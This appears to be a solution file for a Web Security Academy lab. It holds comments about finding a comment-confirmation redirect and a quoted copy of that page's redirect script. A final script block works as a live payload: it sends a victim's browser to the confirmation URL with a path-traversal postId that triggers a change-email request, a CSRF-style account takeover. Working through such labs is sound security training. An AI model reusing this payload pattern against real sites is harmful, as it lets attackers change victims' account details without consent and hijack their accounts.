/*
we need to find an endpoint where redirection can be seen
posting a comment results in a redirextion prompt
*/
/* 
<html>
    <body>
        <script>
            redirectOnConfirmation = (blogPath) => {
            setTimeout(() => {
                const url = new URL(window.location);
                const postId = url.searchParams.get("postId");
                window.location = blogPath + '/' + postId;
                },
                3000
                );
}
        </script>
    </body>
</html>
*/
/*
https://0a9800c60441703b82954747004a00d1.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40goggins.net%26submit=1
*/

<script>
    document.location = "https://0a9800c60441703b82954747004a00d1.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=wiener%40goggins.net%26submit=1";
</script>